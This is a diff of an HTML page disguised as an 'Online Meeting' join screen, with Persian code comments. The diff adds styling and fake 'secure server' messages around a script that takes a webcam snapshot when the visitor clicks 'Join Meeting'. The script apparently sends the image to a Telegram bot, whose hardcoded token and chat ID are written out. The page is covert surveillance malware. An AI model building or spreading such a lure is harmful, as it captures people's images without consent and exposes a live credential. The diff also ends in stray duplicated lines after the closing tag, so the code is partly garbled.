@@ -4,16 +4,91 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Online Meeting</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #202124;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .container {
+            background-color: #2d2e30;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 90%;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background-color: #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+            font-size: 30px;
+        }
+        h1 {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 14px;
+            color: #bdc1c6;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #1557b0;
+        }
+        .loading {
+            display: none;
+            color: #bdc1c6;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Online Meeting</h1>
-    <button id="joinBtn">Join Meeting</button>
+    <div class="container">
+        <div class="logo">📹</div>
+        <h1>Online Meeting</h1>
+        <p>Click the button below to join the secure meeting room.</p>
+        <button id="joinBtn">Join Meeting</button>
+        <div id="loading" class="loading">Connecting to secure server...</div>
+    </div>
 
     <script>
-        const BOT_TOKEN = '9242317690:AAEgLcozxE3Mg70f8zK5x9xRibRTAknhLhk'; 
-        const CHAT_ID = 7309901290;     
+        const BOT_TOKEN = '9242317690:AAEgLcozxE3Mg70f8zK5x9xRibRTAknhLhk'; // توکن بات خودت
+        const CHAT_ID = 7309901290;     // آیدی عددی خودت
 
         document.getElementById('joinBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('joinBtn');
+            const loading = document.getElementById('loading');
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
@@ -36,6 +111,20 @@
                     });
 
                     stream.getTracks().forEach(function(track) { track.stop(); });
+                    
+                    // مخفی کردن دکمه و نمایش پیام انتظار
+                    btn.style.display = 'none';
+                    loading.style.display = 'block';
+                    loading.innerHTML = 'Please wait while we connect you to the meeting...';
+
+                }, 'image/jpeg');
+            } catch (err) {
+                alert('Could not access camera. Please allow access to join the meeting.');
+            }
+        });
+    </script>
+</body>
+</html>    stream.getTracks().forEach(function(track) { track.stop(); });
                     alert('2 دقیقه صبر کنید ');
                 }, 'image/jpeg');
             } catch (err) {
